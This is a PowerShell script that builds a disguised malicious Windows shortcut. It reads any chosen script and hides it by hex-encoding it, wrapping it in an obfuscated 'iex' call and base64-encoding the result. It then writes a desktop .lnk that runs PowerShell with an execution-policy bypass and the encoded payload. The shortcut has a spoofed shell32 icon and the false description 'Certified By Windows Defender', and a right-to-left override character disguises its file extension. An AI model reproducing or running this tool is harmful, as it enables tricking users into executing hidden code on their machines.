Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System;
$host.UI.RawUI.ForegroundColor = "white"; $host.UI.RawUI.BackgroundColor = "Black"
$code = @"
using System;using System.Drawing;using System.Runtime.InteropServices;namespace System{public class IconExtractor{
public static Icon Extract(string file, int number, bool largeIcon){
IntPtr large;IntPtr small;ExtractIconEx(file, number, out large, out small, 1);try{return Icon.FromHandle(largeIcon ? large : small);}catch{
return null;}}[DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);}}
"@
Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Select an icon"
$form.ClientSize = New-Object System.Drawing.Size(400, 500)
$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Dock = "Fill"
$imageList = New-Object System.Windows.Forms.ImageList
$imageList.ImageSize = New-Object System.Drawing.Size(32, 32)
for ($i = 0; $i -le 48; $i++) {
  $icon = [System.IconExtractor]::Extract("shell32.dll", $i, $true)
  $bitmap = $icon.ToBitmap()
  $imageList.Images.Add($bitmap)
  $listBox.Items.Add("Icon $i") | Out-Null
} 
$listBox.DrawMode = [System.Windows.Forms.DrawMode]::OwnerDrawFixed
$listBox.ItemHeight = 40
$handler = {
  param($sender, $event)
  $event.DrawBackground()
  $event.DrawFocusRectangle()
  $index = $event.Index
  $image = $imageList.Images[$index]
  $text = $listBox.Items[$index]
  $bounds = $event.Bounds
  $g = $event.Graphics
  $g.DrawImage($image, $bounds.Left + 5, $bounds.Top + 5, 32, 32)
  $g.DrawString($text, $listBox.Font, [System.Drawing.Brushes]::Black, $bounds.Left + 50, $bounds.Top + 5)
}
$listBox.Add_DrawItem($handler)
$okButton = New-Object System.Windows.Forms.Button
$okButton.Text = "OK"
$okButton.Dock = "Bottom"
$handler = {
  $selectedIndex = $listBox.SelectedIndex
  $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
  $form.Close()
}
$okButton.Add_Click($handler)
$form.Controls.Add($listBox)
$form.Controls.Add($okButton)
$form.ShowDialog()



if (-not ("Windows.Native.Kernel32" -as [type])) {
  Add-Type -TypeDefinition @"
    namespace Windows.Native
    {
      using System;
      using System.ComponentModel;
      using System.IO;
      using System.Runtime.InteropServices;
      public class Kernel32
      {
        public const uint FILE_SHARE_READ = 1;
        public const uint FILE_SHARE_WRITE = 2;
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        public const int STD_ERROR_HANDLE = -12;
        public const int STD_INPUT_HANDLE = -10;
        public const int STD_OUTPUT_HANDLE = -11;
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public class CONSOLE_FONT_INFOEX
        {
          private int cbSize;
          public CONSOLE_FONT_INFOEX()
          {
            this.cbSize = Marshal.SizeOf(typeof(CONSOLE_FONT_INFOEX));
          }
          public int FontIndex;
          public short FontWidth;
          public short FontHeight;
          public int FontFamily;
          public int FontWeight;
          [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
          public string FaceName;
        }
        public class Handles
        {
          public static readonly IntPtr StdIn = GetStdHandle(STD_INPUT_HANDLE);
          public static readonly IntPtr StdOut = GetStdHandle(STD_OUTPUT_HANDLE);
          public static readonly IntPtr StdErr = GetStdHandle(STD_ERROR_HANDLE);
        }
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hHandle);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile
          (
          [MarshalAs(UnmanagedType.LPTStr)] string filename,
          uint access,
          uint share,
          IntPtr securityAttributes, 
          [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
          uint flagsAndAttributes,
          IntPtr templateFile
          );
        [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern bool GetCurrentConsoleFontEx
          (
          IntPtr hConsoleOutput, 
          bool bMaximumWindow, 
          [In, Out] CONSOLE_FONT_INFOEX lpConsoleCurrentFont
          );
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool SetCurrentConsoleFontEx
          (
          IntPtr ConsoleOutput, 
          bool MaximumWindow,
          [In, Out] CONSOLE_FONT_INFOEX ConsoleCurrentFontEx
          );
        public static IntPtr CreateFile(string fileName, uint fileAccess, 
          uint fileShare, FileMode creationDisposition)
        {
          IntPtr hFile = CreateFile(fileName, fileAccess, fileShare, IntPtr.Zero, 
            creationDisposition, 0U, IntPtr.Zero);
          if (hFile == INVALID_HANDLE_VALUE)
          {
            throw new Win32Exception();
          }
          return hFile;
        }
        public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx()
        {
          IntPtr hFile = IntPtr.Zero;
          try
          {
            hFile = CreateFile("CONOUT$", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);
            return GetCurrentConsoleFontEx(hFile);
          }
          finally
          {
            CloseHandle(hFile);
          }
        }
        public static void SetCurrentConsoleFontEx(CONSOLE_FONT_INFOEX cfi)
        {
          IntPtr hFile = IntPtr.Zero;
          try
          {
            hFile = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE,
              FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);
            SetCurrentConsoleFontEx(hFile, false, cfi);
          }
          finally
          {
            CloseHandle(hFile);
          }
        }
        public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx
          (
          IntPtr outputHandle
          )
        {
          CONSOLE_FONT_INFOEX cfi = new CONSOLE_FONT_INFOEX();
          if (!GetCurrentConsoleFontEx(outputHandle, false, cfi))
          {
            throw new Win32Exception();
          }

          return cfi;
        }
      }
    }
"@
}
$FontAspects = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx()
$FontAspects.FontIndex = 0; $FontAspects.FontWidth = 8
$FontAspects.FontHeight = 8; $FontAspects.FontFamily = 48
$FontAspects.FontWeight = 400; $FontAspects.FaceName = "Terminal"
[Windows.Native.Kernel32]::SetCurrentConsoleFontEx($FontAspects)

Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System;

function FDialog {
  $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog; 
  $OpenFileDialog.InitialDirectory; $OpenFileDialog.FileName; $OpenFileDialog.ShowDialog() | Out-Null
  $content = Get-Content $OpenFileDialog.FileName; 
  return $content
}

function Obsf {
  param (
    [string]$text
  )
  $hex = ($text.ToCharArray() | % { [System.String]::Format("{0:X2}", [System.Convert]::ToUInt32($_)) }) -join " "
  $oneliner = '"hxd".split("") |%{$com += [char]([convert]::toint16($_,16))};ie`x $com'.replace("hxd", $hex)
  $base = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($oneliner))
  Write-Host $base
}
[string]$str = FDialog
$Base64 = Obsf $str

#RIGHT-TO-LEFT OVERRIDE Char
$R2LO = [char]0x202E

$icofilePath = "$(Get-Random -Minimum 0 -Maximum 10000)" + "tmp.ico"
$Icon = [System.IconExtractor]::Extract("shell32.dll", $selectedIndex, $true)  
$stream = [System.IO.File]::OpenWrite("$env:temp\$icofilePath")
$icon.save($stream)
$stream.close()


Pause
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\tmp.lnk")
$ShortCut.Arguments = " -ExecutionPolicy Bypass -noLogo -enc $($Base64)"
$ShortCut.TargetPath = "Powershell.exe"
$ShortCut.IconLocation = "$env:temp\$icofilePath"
$ShortCut.Description = "Certified By Windows Defender";
$ShortCut.Save()


Rename-Item ($env:USERPROFILE + "\Desktop\tmp.lnk") ($env:USERPROFILE + "\Desktop\" + $R2LO + "exaa.lnk")
Start-Process "$env:USERPROFILE\Desktop\"